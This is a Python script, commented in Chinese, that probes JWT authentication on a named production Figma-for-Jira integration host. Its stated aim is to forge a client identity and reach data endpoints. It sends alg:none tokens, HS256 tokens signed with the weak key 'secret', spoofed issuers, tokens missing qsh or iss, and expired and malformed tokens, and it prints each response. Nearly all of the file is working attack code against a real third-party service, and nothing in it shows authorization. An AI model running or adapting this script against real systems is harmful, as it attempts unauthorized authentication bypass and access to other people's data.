# -*- coding: utf-8 -*-
"""Jira 集成 API JWT 校验细节探测: figma-for-jira.figma.com
思路: 用 JWT 变体反推校验逻辑 (alg/签名/iss/qsh 是否严格),
     目标是找到可伪造的客户端身份声明 → 调 getEntityByUrl 等端点
"""
import base64, hashlib, hmac, io, json, sys, time, urllib.error, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://figma-for-jira.figma.com"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def make_jwt(header: dict, payload: dict, secret: str = "") -> str:
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig = ""
    if header.get("alg", "none") != "none":
        msg = f"{h}.{p}".encode()
        sig = b64url(hmac.new(secret.encode(), msg, hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"


def call(label, path, token, method="GET", body=None):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
               "Accept": "application/json"}
    if token:
        headers["Authorization"] = "JWT " + token
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} {raw[:300]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} {raw[:300]}")
        return e.code, raw


now = int(time.time())
CLIENT_KEY = "figma-test-instance"
QSH_DUMMY = "deadbeef"

# qsh 算法 (Atlassian connect 1.0):
def qsh(method, path, query=""):
    canonical = f"{method}&{path}&{query}"
    return hashlib.sha256(canonical.encode()).hexdigest()

print("===== 1. alg:none 绕过 =====")
call("none+empty", "/auth/checkAuth", make_jwt(
    {"alg": "none", "typ": "JWT"},
    {"iss": CLIENT_KEY, "iat": now, "exp": now + 3600, "qsh": qsh("GET", "/auth/checkAuth")}))
call("none+sig", "/auth/checkAuth", make_jwt(
    {"alg": "none", "typ": "JWT"},
    {"iss": CLIENT_KEY, "iat": now, "exp": now + 3600, "qsh": qsh("GET", "/auth/checkAuth")}) + ".AAAA")

print("\n===== 2. HS256 弱密钥 (错误签名) =====")
call("hs256 weak", "/auth/checkAuth", make_jwt(
    {"alg": "HS256", "typ": "JWT"},
    {"iss": CLIENT_KEY, "iat": now, "exp": now + 3600, "qsh": qsh("GET", "/auth/checkAuth")}, "secret"))

print("\n===== 3. 随机 issuer (客户端身份声明) =====")
call("rand iss", "/auth/checkAuth", make_jwt(
    {"alg": "HS256", "typ": "JWT"},
    {"iss": "JIRA-RANDOM-12345", "iat": now, "exp": now + 3600, "qsh": qsh("GET", "/auth/checkAuth")}, "secret"))

print("\n===== 4. 缺 qsh / 缺 iss =====")
call("no qsh", "/auth/checkAuth", make_jwt(
    {"alg": "none", "typ": "JWT"},
    {"iss": CLIENT_KEY, "iat": now, "exp": now + 3600}))
call("no iss", "/auth/checkAuth", make_jwt(
    {"alg": "none", "typ": "JWT"},
    {"iat": now, "exp": now + 3600, "qsh": qsh("GET", "/auth/checkAuth")}))

print("\n===== 5. 过期 / 未来 =====")
call("expired", "/auth/checkAuth", make_jwt(
    {"alg": "none", "typ": "JWT"},
    {"iss": CLIENT_KEY, "iat": now - 7200, "exp": now - 3600, "qsh": qsh("GET", "/auth/checkAuth")}))

print("\n===== 6. 畸形 token =====")
call("malformed", "/auth/checkAuth", "not.a.jwt")
call("empty", "/auth/checkAuth", "")

print("\n===== 7. POST 变体 =====")
call("POST none", "/auth/checkAuth", make_jwt(
    {"alg": "none", "typ": "JWT"},
    {"iss": CLIENT_KEY, "iat": now, "exp": now + 3600, "qsh": qsh("GET", "/auth/checkAuth")}), method="POST")

print("\n===== 8. 其他端点 with none =====")
tok = make_jwt({"alg": "none", "typ": "JWT"},
               {"iss": CLIENT_KEY, "iat": now, "exp": now + 3600, "qsh": qsh("GET", "/entities/getEntityByUrl")})
call("none getEntityByUrl", "/entities/getEntityByUrl", tok)
